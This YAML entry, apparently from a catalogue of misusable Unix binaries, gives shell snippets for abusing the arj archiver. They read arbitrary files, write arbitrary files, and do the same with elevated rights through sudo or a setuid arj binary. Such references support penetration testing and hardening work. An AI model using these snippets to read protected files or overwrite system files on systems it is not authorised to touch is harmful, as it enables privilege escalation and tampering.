---
functions:
  file-read:
    - description: The file appears amid some other textual information. The archive can also be downloaded then extracted offline.
      code: |
        TF=$(mktemp -u)
        LFILE=file_to_read
        arj a "$TF" "$LFILE"
        arj p "$TF"
  file-write:
    - description: The archive can also be prepared offline then uploaded.
      code: |
        TF=$(mktemp -d)
        LFILE=file_to_write
        LDIR=where_to_write
        echo DATA >"$TF/$LFILE"
        arj a "$TF/a" "$TF/$LFILE"
        arj e "$TF/a" $LDIR
  sudo:
    - description: The archive can also be prepared offline then uploaded.
      code: |
        TF=$(mktemp -d)
        LFILE=file_to_write
        LDIR=where_to_write
        echo DATA >"$TF/$LFILE"
        arj a "$TF/a" "$TF/$LFILE"
        sudo arj e "$TF/a" $LDIR
  suid:
    - description: The archive can also be prepared offline then uploaded.
      code: |
        TF=$(mktemp -d)
        LFILE=file_to_write
        LDIR=where_to_write
        echo DATA >"$TF/$LFILE"
        arj a "$TF/a" "$TF/$LFILE"
        ./arj e "$TF/a" $LDIR
---
